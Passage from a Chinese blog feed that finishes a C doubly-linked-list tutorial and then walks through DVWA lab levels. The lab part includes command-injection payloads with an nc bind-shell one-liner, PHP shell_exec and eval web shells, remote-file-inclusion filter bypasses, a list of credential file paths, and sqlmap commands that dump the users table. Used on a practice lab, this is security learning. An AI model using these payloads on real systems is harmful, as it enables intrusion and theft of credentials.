class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** 双向链表 */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LinkList</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> length;</span><br><span class="line">    Node * next;</span><br><span class="line">&#125;LinkList;</span><br></pre></td></tr></table></figure><h4 id="双向链表的插入"><a href="#双向链表的插入" class="headerlink" title="双向链表的插入"></a>双向链表的插入</h4><p>　　<b>第一种情况</b>:插入的位置在第一个，链表为空<br>　　<img src="https://s1.ax1x.com/2020/07/19/URjjj1.gif"><br>　　<b>第二种情况</b>:插入的位置在第一个，链表不为空<br>　　<img src="https://s1.ax1x.com/2020/07/19/URzXcj.gif"><br>　　<b>第三种情况</b>:插入的位置在中间<br>　　<img src="https://s1.ax1x.com/2020/07/19/URxJRH.gif"><br>　　<b>第四种情况</b>:插入的位置在最后<br>　　<img src="https://s1.ax1x.com/2020/07/19/UWSIxJ.gif"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 向双向链表指向位置插入元素</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InsertDoublyLinkList</span><span class="params">(LinkList * linkList,<span class="keyword">int</span> pos,<span class="keyword">int</span> id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 创建空结点</span></span><br><span class="line">    Node * node = (Node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">    node-&gt;id = id;</span><br><span class="line">    node-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    node-&gt;prev = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(pos == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//链表不为空</span></span><br><span class="line">        <span class="keyword">if</span>(linkList-&gt;length != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">           node-&gt;next = linkList-&gt;next;</span><br><span class="line">           linkList-&gt;next-&gt;prev = node;</span><br><span class="line">        &#125;</span><br><span class="line">        linkList-&gt;next = node;  <span class="comment">//更新头指针</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        Node * preNode = linkList-&gt;next;    <span class="comment">//获取到要插入位置的前缀结点</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; pos - <span class="number">1</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            preNode = preNode-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 在中间插入</span></span><br><span class="line">        <span class="keyword">if</span> (preNode-&gt;next != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            node-&gt;next = preNode-&gt;next;</span><br><span class="line">            preNode-&gt;next-&gt;prev = node; </span><br><span class="line">        &#125;</span><br><span class="line">        node-&gt;prev = preNode;   </span><br><span class="line">        preNode-&gt;next = node;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    linkList-&gt;length++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="双向链表的删除"><a href="#双向链表的删除" class="headerlink" title="双向链表的删除"></a>双向链表的删除</h4><p>　　<b>第一种情况</b>:删除的位置在第一个，链表长度为1<br>　　<img src="https://s1.ax1x.com/2020/07/19/UW90Xj.gif"></p><p>　　请勿将代码直接写成 头指针=null (linkList-&gt;next = null)的形式，而是换一种等价写为法:linkList-&gt;next = node-&gt;next，这种写法将直接减少代码行数<br>　　<b>第二种情况</b>:删除的位置在第一个，链表长度不为1<br>　　<img src="https://s1.ax1x.com/2020/07/19/UWCvGT.gif"><br>　　<b>第三种情况</b>:删除的位置在中间<br>　　<img src="https://s1.ax1x.com/2020/07/19/UWiG7R.gif"><br>　　<b>第四种情况</b>:删除的位置在最后<br>　　<img src="https://s1.ax1x.com/2020/07/19/UWkUyD.gif"><br>　　这里找删除结点跟前两个不一样，因为有了前缀结点，所以找结点的时候直接找到要删除的结点即可，而不是要删除的结点的前缀结点</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在指定位置删除元素</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DeleteLinkList</span><span class="params">(LinkList * linkList,<span class="keyword">int</span> pos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Node * node = linkList-&gt;next;   <span class="comment">//获取到链表的第一个结点</span></span><br><span class="line">    <span class="keyword">if</span> (pos == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 链表长度不为1</span></span><br><span class="line">        <span class="keyword">if</span> (node-&gt;next != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            node-&gt;next-&gt;prev = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        linkList-&gt;next = node-&gt;next;    <span class="comment">//更新头指针</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 循环找到要删除的结点的位置</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; pos; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            node = node-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        node-&gt;prev-&gt;next = node-&gt;next;</span><br><span class="line">        <span class="comment">// 不是在最后一个位置删除</span></span><br><span class="line">        <span class="keyword">if</span>(node-&gt;next != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            node-&gt;next-&gt;prev = node-&gt;prev;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(node);</span><br><span class="line">    linkList-&gt;length--;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>　　至此，链表的核心操作就介绍完了，感谢大家的阅读！为了更好的理解链表的详细操作步骤，本人花费大量的时间做出这些gif图片。如果你要使用这些图片，请包含转账信息，在此谢谢各位大佬！</p>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 链表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA</title>
      <link href="/2020/04/21/57354.html"/>
      <url>/2020/04/21/57354.html</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在大约2017-2018年时间就安装过dvwa，那时候只对安全方面感兴趣，也不知道这玩意是干啥的，所以果断安装好后就被我搁置了。最近这段时间，重新学习安全体系，才知道dvwa是一个非常优秀的靶场。闲话不多说，本章介绍dvwa基本过关锦集，献给我第一个学习靶场dvwa。<br><a id="more"></a><br>靶机使用的是Metasploitable2-Linux集成的dvwa环境，不同的dvwa版本，难度选项有些有4个最后一个选项是impossible，我的只有3个，即high=impossible。</p><h3 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h3><p>　　爆破表单，主要看你的字典内容是否丰富，首先打开burp，抓包拦截后放进intruder模块。我写过burp使用教程，不懂的移步<a target="_blank" href="https://snowmeteors.github.io/2020/03/29/48647.html">burpsuite使用教程</a>，不多说了。<br>　　low级别，设置好攻击变量，攻击类型Cluster bomb后，开始设置payloads。<br>　　<a href="https://imgchr.com/i/JGmedH" target="_blank" rel="noopener"><img src data-echo="https://s1.ax1x.com/2020/04/21/JGmedH.png" alt="JGmedH.png"></a><br>　　因为知道用户名和密码，为了不浪费时间，我就随便添加几个，如图所示。<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/21/JGnwAH.png" alt="JGnwAH.png"><br>　　点击attack后，根据length排序找到正确的用户名和密码<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/24/JDDop6.png" alt="JDDop6.png"><br>　　medium级别，还是跟上面一模一样的配置，开始攻击后，情况跟low级别的代码一模一样，我一度以为我是不是没有调整级别。<br>　　high级别下，每次发包会延迟2s，但是只要你有耐心，也能爆破出来不是吗。</p><h3 id="Command-Execution"><a href="#Command-Execution" class="headerlink" title="Command Execution"></a>Command Execution</h3><p>　　执行模块，low级别下。首先可以看到输入一个ip地址，那么先输入一个正确的ip地址127.0.0.1试试<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/21/JGM89s.png" alt="JGM89s.png"><br>　　回显正确，试试加入管道符：127.0.0.1 &amp;&amp; ls<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/21/JG3lq0.png" alt="JG3lq0.png"><br>　　命令成功执行，查看源码，创建一个target变量，后面直接执行ping target，无任何消毒机制<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/21/JGGE9g.png" alt="JGGE9g.png"><br>　　执行;mkfifo /tmp/pipe;sh /tmp/pipe | nc -lvp 4444 &gt; /tmp/pipe后，你会发现最上面的标签栏有个圈圈会不停的转，利用nc连接可以直接得到shell，权限也不是root还要进一步提权。<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/22/JNfJsg.png" alt="JNfJsg.png"><br>　　medium级别，还是试试127.0.0.1 &amp;&amp; ls，执行后发现无任何回显。说明过滤了’&amp;’换一种姿势试了127.0.0.1 ; ls无果。 尝试127.0.0.1 | ls<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/21/JGJePO.png" alt="JGJePO.png"><br>　　命令有效，那么在试试127.0.0.1 &amp;&amp;&amp; ls 呢<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/21/JGY9Ff.png" alt="JGY9Ff.png"><br>　　猜测只过滤一次&amp;那么过滤完后的payload就为127.0.0.1 &amp;&amp; ls了，127.0. || ls也是可以成功执行的，也就是说没有过滤’|’。直接看源码<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/21/JGtwEq.png" alt="JGtwEq.png"><br>　　嗯，好吧我承认猜测情况有点差别。它的过滤机制是将’&amp;&amp;’字符变成空字符，将’;’同样变成空字符。<br>　　high级别，我尝试了上述所有payload后无果，好吧直接看源码。看它的消毒机制怎么写的如此完善。<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/21/JGNeiV.png" alt="JGNeiV.png"><br>　　看不懂没关系，因为我也没有学过php，但学过其他语言的我，基本还是能懂点啥意思，它的过滤机制是只能输入一个ip，如果不是一个正确的ip就出现ERROR: You have entered an invalid IP。所以不存在命令执行，当然你有什么方法能绕过，请一定一定要联系我。我也想知道这到底怎么绕。</p><h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p>　　跨站请求伪造，以下为我对这个csrf的理解<br>　　有一个站点a，里面有修改密码的功能，此功能中只有一个修改密码框，你只需要输入要修改的密码后，点提交就能成功修改密码了。如修改密码为123<br>　　然后查看url发现是get方式如 http://<span>www</span>.xxx.com?password_new=123，猜测是否可以直接修改url中的123来修改密码，于是乎试试提交http://<span>www</span>.xxx.com?password_new=456。发现成功将自己的密码修改成了456。<br>　　那么问题来了，是不是只要在你已经登录了此a站点的情况下，攻击者发给你这个http://<span>www</span>.xxx.com?password_new=xxx，xxx是对方设置的密码，你的密码就会被成功修改？答案是肯定的，这就是一个非常非常简单的csrf。为啥非得要你登陆了此站点下点链接，才会被修改，这个问题不言而喻吧。<br>　　low级别，在burp中有csrf功能，直接开burp，截取到数据包后点击Generate CSRF PoC<br>　   <img src data-echo="https://s1.ax1x.com/2020/04/21/JGD9kd.png" alt="JGD9kd.png"><br>　　下面的框中给出了csrf html代码。可以看到我将密码设置成了passwd<br>　   <img src data-echo="https://s1.ax1x.com/2020/04/21/JGssTe.png" alt="JGssTe.png"><br>　　选择最下面的Copy HTML。当然你也可以直接点击Test in browser，不知道为啥我这里无效，所以只能手动保存为html文件<br>　　运行此html后，就是一个非常简单的提交框，点击后密码就会被改变，当然如果在真实的环境下，你要做的尽量真实。比如rtx2080ti大减价，点开链接疯狂抢购啥的。<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/21/JG6aqK.png" alt="JG6aqK.png"><br>　　点击提交框后，密码修改成功<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/21/JGcI0K.png" alt="JGcI0K.png"><br>　　查看源码，中间将新的密码通过sql命令更新，可能这里也存在sql注入漏洞，无任何消毒csrf机制，mysql_real_escape_string有消毒sql命令<br>　　<a href="https://imgchr.com/i/JG2QVf" target="_blank" rel="noopener"><img src data-echo="https://s1.ax1x.com/2020/04/21/JG2QVf.png" alt="JG2QVf.png"></a><br>　　medium级别，上述过程全部一样，然后直接点提交按钮后，发现无任何内容，密码修改不成功。嗯我选择放弃，直接查看源码<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/21/JGfjdx.png" alt="JGfjdx.png"><br>　　多了if判断，referer头是否来自127.0.0.1即本机，嗯这个简单，点击提交功能后，burp拦截下来，添加referer头为127.0.0.1。<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/21/JGhL9S.png" alt="JGhL9S.png"><br>　　forward后，成功修改密码<br>　　high级别，你可以看到多了一个输入原密码的框，所以不存在csrf。</p><h3 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h3><p>　　文件包含漏洞，分为本地文件包含和远程文件包含，php里面的我不是太懂，所以我也不会乱说，详细了解移步<a href="https://www.freebuf.com/articles/web/182280.html" target="_blank" rel="noopener">freebuf文件包含</a>。<br>　　本地文件包含直接可以查看到本地文件，造成信息泄露<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/21/JGOq6P.png" alt="JGOq6P.png"><br>　　可以看到passwd文本中的内容，以下是常见的存储位置<br>Windows系统<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c:<span class="symbol">\b</span>oot.ini  // 查看系统版本</span><br><span class="line">c:<span class="symbol">\w</span>indows<span class="symbol">\s</span>ystem32<span class="symbol">\i</span>netsrv<span class="symbol">\M</span>etaBase.xml // IIS配置文件</span><br><span class="line">c:<span class="symbol">\w</span>indows<span class="symbol">\r</span>epair<span class="symbol">\s</span>am // 存储Windows系统初次安装的密码</span><br><span class="line">c:<span class="symbol">\P</span>rogramFiles<span class="symbol">\m</span>ysql<span class="symbol">\m</span>y.ini // MySQL配置</span><br><span class="line">c:<span class="symbol">\P</span>rogramFiles<span class="symbol">\m</span>ysql<span class="symbol">\d</span>ata<span class="symbol">\m</span>ysql<span class="symbol">\u</span>ser.MYD // MySQL root密码</span><br><span class="line">c:<span class="symbol">\w</span>indows<span class="symbol">\p</span>hp.ini // php 配置信息</span><br></pre></td></tr></table></figure></p><p>Linux/Unix系统<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta-keyword">/etc/</span>passwd <span class="comment">// 账户信息</span></span><br><span class="line"><span class="meta-keyword">/etc/</span>shadow <span class="comment">// 账户密码文件</span></span><br><span class="line"><span class="meta-keyword">/usr/</span>local<span class="meta-keyword">/app/</span>apache2<span class="meta-keyword">/conf/</span>httpd.conf <span class="comment">// Apache2默认配置文件</span></span><br><span class="line"><span class="meta-keyword">/usr/</span>local<span class="meta-keyword">/app/</span>apache2<span class="meta-keyword">/conf/</span>extra/httpd-vhost.conf <span class="comment">// 虚拟网站配置</span></span><br><span class="line"><span class="meta-keyword">/usr/</span>local<span class="meta-keyword">/app/</span>php5<span class="meta-keyword">/lib/</span>php.ini <span class="comment">// PHP相关配置</span></span><br><span class="line"><span class="meta-keyword">/etc/</span>httpd<span class="meta-keyword">/conf/</span>httpd.conf <span class="comment">// Apache配置文件</span></span><br><span class="line"><span class="meta-keyword">/etc/</span>my.conf <span class="comment">// mysql 配置文件</span></span><br></pre></td></tr></table></figure><br>　　远程文件包含，首先启动kali中的apach2服务<br>　　输入service apache2 start，成功开启后没有任何提示，输入cd /var/www/html来到站点目录下。创建一个1.txt文件内容为&lt;?php echo shell_exec($_GET[‘cmd’]);?<span>&gt;</span>，这句话意思是执行shell命令<br>　　访问该站点看是否能正常读取文件内容<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/21/JJSnQs.png" alt="JJSnQs.png"><br>　　成功执行ls命令，如果在low的级别下远程包含出错移步<a href="https://blog.csdn.net/wang_624/article/details/90381314" target="_blank" rel="noopener">解决远程文件包含出错</a>，所以远程文件包含远远不是信息泄露的问题了，已经上升到命令执行了，当然你也可以拿shell了。<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/21/JJ7XQK.png" alt="JJ7XQK.png"><br>　　low级别源码为<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    $file = $_GET[<span class="string">'page'</span>]; <span class="comment">//The page we wish to display  </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>　　medium级别下，本地文件包含漏洞也无任何过滤，试试远程文件包含，http://<span></span>192.168.2.161/1.txt&amp;cmd=ls，执行后发现无任何反应，产生过滤。可以考虑转换成url编码进行绕过<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/22/JtS5tK.png" alt="JtS5tK.png"><br>　　执行后，发现url部分’http’被解码了，也被过滤了<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/22/JtSzh8.png" alt="JtSzh8.png"><br>　　可以尝试双层编码，即刚刚的编码再次编码一次<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/22/JtpDHI.png" alt="JtpDHI.png"><br>　　双层后url已经非常长了，复制后再次提交，还是无任何反应。猜测可能只对http头部分过滤成空字符，于是再次构造payload为<span>httphttp://<span></span>192.168.2.161/1.txt&amp;cmd=ls</span>，还是无任何反应，改为http://<span>http://<span></span>192.168.2.161/1.txt&amp;cmd=ls</span>，执行后也无任何反应。有点神奇，试试改变http://的位置后变为hthttp<span></span>://tp://192.168.2.161/1.txt&amp;cmd=ls后，命令成功执行说明过滤的很可能是’http://‘这一部分。<br>　　源码为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    $file = $_GET[<span class="string">'page'</span>]; <span class="comment">// The page we wish to display </span></span><br><span class="line">    <span class="comment">// Bad input validation </span></span><br><span class="line">    $file = str_replace(<span class="string">"http://"</span>, <span class="string">""</span>, $file); </span><br><span class="line">    $file = str_replace(<span class="string">"https://"</span>, <span class="string">""</span>, $file);         </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>　　将http:// https:// 过滤掉，查阅str_replace函数，发现此函数是区分大小写的，所以我重新构造url为HTTP://<span></span>192.168.2.161/1.txt&amp;cmd=ls，发现还是不能成功执行，这个是我的疑惑点所在<br>　　high级别，直接查看源码，因为过不了不浪费时间</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line">    $file = $_GET[<span class="string">'page'</span>]; <span class="comment">//The page we wish to display  </span></span><br><span class="line">    <span class="comment">// Only allow include.php </span></span><br><span class="line">    <span class="keyword">if</span> ( $file != <span class="string">"include.php"</span> ) &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"ERROR: File not found!"</span>; </span><br><span class="line">        <span class="keyword">exit</span>; </span><br><span class="line">    &#125;    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>　　写的很清楚了，url中只能有include.php，所以不存在文件包含漏洞</p><h3 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h3><p>　　SQL注入，我不会非常详细的写手工注入过程，因为实在是太长，太繁琐了。讲讲我理解的漏洞产生原理。最好你有sql命令基础。将用户提交的值带进sql查询语句，由于没有过滤用户提交的字符，从而导致的sql注入攻击。<br>　　<b>按照注入点类型来分类</b><br>　　数字型注入点、字符型注入点、搜索型注入点<br>　　<b>按照数据提交的方式来分类</b><br>　　GET 注入、POST 注入、Cookie 注入、HTTP 头部注入<br>　　<b>按照执行效果来分类</b><br>　　基于布尔的盲注、基于时间的盲注、基于报错注入、联合查询注入、堆查询注入、宽字节注入<br>　　这里的环境是报错注入，说的有点含糊直接看源码。<br>　　low级别<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/22/JNiUNn.png" alt="JNiUNn.png"><br>　　源码可知，创建了一个id变量，将这个变量带入SELECT first_name, last_name FROM users WHERE user_id = ‘$id’中，如果我输入1就是user_id = ‘1’，查询uer_id是1的用户信息<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/22/JNixv8.png" alt="JNixv8.png"><br>　　这只是我合法的提交，如果我提交一个’上去，查询语句就变成user_id=’’’，在sql语句中’号或者”号都是成对出现的如，’’,””，这样所以这会使查询语句报错。当然你可能会问万一有用户id是’呢，所以我们还要多次测试验证确实有sql注入语句。<br>　　第一次提交’<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/22/JNkx0g.png" alt="JNkx0g.png"><br>　　出现sql查询语句出错，这样有报错信息的叫sql报错注入，而且可以看到我们只提交了’，报错了near ‘’’’’，很明显就是引号不配对造成的错误。<br>　　第二次提交1’ and 1=1 # ，完整的查询语句就是SELECT first_name, last_name FROM users WHERE user_id = ‘1’ and 1=1 #’<br>　　#在sql语句是注释意思，and or 这是基本的逻辑关系，但凡有点数学逻辑基本能懂1=1这种是真，所以整条逻辑就是真<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/22/JNE3Ps.png" alt="JNE3Ps.png"><br>　　id就变成了提交信息去了，很明显存在sql注入攻击。提交改为1’ and 1=2 #，提交后无任何回显。因为1=2就是假，又是and整条语句逻辑上就是假，所以就不执行sql语句。<br>　　剩下的就是什么查表，查数据库，查字段，查属性，获取用户名，主机名等等信息，反正sql命令能做的都能做到。本文章不详细说明人工注入，这里上注入神器sqlmap，还是那句话我也不详细说明sqlmap的具体命令。<br>　　这里要说明的是sqlmap只能检测一个url是否存在sql注入，而不是给网站的url如www<span></span>.baidu.com。先提交一个1上去后，复制url。<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/22/JNnfC4.png" alt="JNnfC4.png"><br>　　-u 指定一个可疑存在sql注入的url，因为这个dvwa是需要登录的，所以要加上cookie命令，–dbs是查询有哪些数据库。执行后如图所示查询到的数据库<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/22/JNuDiD.png" alt="JNuDiD.png"><br>　　查询数据库，表，字段，属性内容如下命令，更多命令请移步<a href="https://www.freebuf.com/sectool/164608.html" target="_blank" rel="noopener">超详细SQLMap使用攻略及技巧分享</a></p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">-</span><span class="comment">dbs</span> <span class="comment">查看有哪些数据库</span></span><br><span class="line"><span class="comment"></span><span class="literal">-</span><span class="comment">D</span> <span class="comment">数据库名</span> --<span class="comment">tables</span> <span class="comment">查看当前数据库有哪些表</span> </span><br><span class="line"><span class="literal">-</span><span class="comment">D</span> <span class="comment">数据库名</span> <span class="literal">-</span><span class="comment">T</span> <span class="comment">表名</span> --<span class="comment">columns</span> <span class="comment">查看字段</span></span><br><span class="line"><span class="comment"></span><span class="literal">-</span><span class="comment">D</span> <span class="comment">数据库名</span> <span class="literal">-</span><span class="comment">T</span> <span class="comment">表名</span> --<span class="comment">column</span> --<span class="comment">dump</span> <span class="comment">查看当前表内容</span></span><br></pre></td></tr></table></figure><p>　　接着继续查询dvwa数据库中有哪些表。<br>　　输入sqlmap -u “http://<span></span>192.168.2.123/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#” –cookie=”PHPSESSID=ef87119a9e058a4616fd5132529eee34;security=low” -D dvwa –tables<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/22/JNK7tO.png" alt="JNK7tO.png"><br>　　继续查询users表中有哪些字段，输入sqlmap -u “http://<span></span>192.168.2.123/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#” –cookie=”PHPSESSID=ef87119a9e058a4616fd5132529eee34;security=low” -D dvwa -T users –columns<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/22/JNMnEV.png" alt="JNMnEV.png"><br>　　最后只需要查询users表中字段的具体内容就完毕了，输入sqlmap -u “http://<span></span>192.168.2.123/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#” –cookie=”PHPSESSID=ef87119a9e058a4616fd5132529eee34;securitwa -T users –columns –dump，因为从结果中大致判断password是md5加密的，所以中间会弹出询问信息，您是否想通过基于字典的攻击来破解它们？我一般直接输入n=no，然后这玩意随便找个md5在线破解。md5是不可逆的，所以这种攻击叫md5撞库解密。<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/22/JNQtMj.png" alt="JNQtMj.png"><br>　　medium级别，还是直接看代码<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/22/JN6wi8.png" alt="JN6wi8.png"><br>　　可以看到有一个函数mysql_real_escape_string() ，过滤的字符有\x00、\n、\r、’、”、\x1a<br>　　这就意味这我们只要输入有’就会被过滤掉，但仔细看sql语句是SELECT first_name, last_name FROM users WHERE user_id = $id，少了两个’$id’，所以还减轻了我们的输入量直接提交1 or 1=2也能成功执行<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/22/JN4S41.png" alt="JN4S41.png"><br>　　high级别<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/22/JUpdu4.png" alt="JUpdu4.png"><br>　　前面直接也是用函数过滤，然后执行if(is_numeric($id))，判断输入是不是数字，好了没有sql注入了散了散了。。</p><h3 id="SQL-Injection-Blind"><a href="#SQL-Injection-Blind" class="headerlink" title="SQL Injection (Blind)"></a>SQL Injection (Blind)</h3><p>　　sql布尔盲注，返回是布尔类型即逻辑，比如sql整条语句是真，就返回一种结果。是假可能就是宁一种结果。<br>　　这次直接提交’上去后，发现无任何回显结果，然而在报错注入中给出了报错信息。这也是布尔盲注的一种特性，然后提交1’ and 1=1 #<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/22/JNE3Ps.png" alt><br>　　整体提交值被代入，后面构造payload就要用ascii()，len()，char()等等函数，太多了这不是本章的重点，直接跳过</p><h3 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h3><p>　　文件上传漏洞，为啥上传个文件都能成漏洞，这个问题提的不错。上传文件功能或多或少一些网站都有，上传照片，文档基本都是个最基本的功能。不过这只是按照常规的方式去思考问题，安全应该大开脑洞，不应该局限自己的思维，试想如果上传一个木马文件上去会怎么样。直接拿到对方服务器权限了啊，所以这就是文件上传漏洞。<br>　　low级别，直接上传一个php一句话木马试试。1.php里面内容为&lt;<span></span>?php @eval($_POST[‘hacker’]); ?&gt;<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/22/JUERHS.png" alt="JUERHS.png"><br>　　看着上面一行英文，请选择一张图片上传，再看看我上传的是php嗯，very good，源码就不看了，因为这部分是我最熟悉的，然而源码却是我最看不懂的部分。。。。<br>　　medium级别，还是直接像刚刚那样上传php<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/22/JUVIaD.png" alt="JUVIaD.png"><br>　　文件上传大多数要用抓包工具，还是直接上burp。抓包截断后<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/22/JUmeC4.png" alt="JUmeC4.png"><br>　　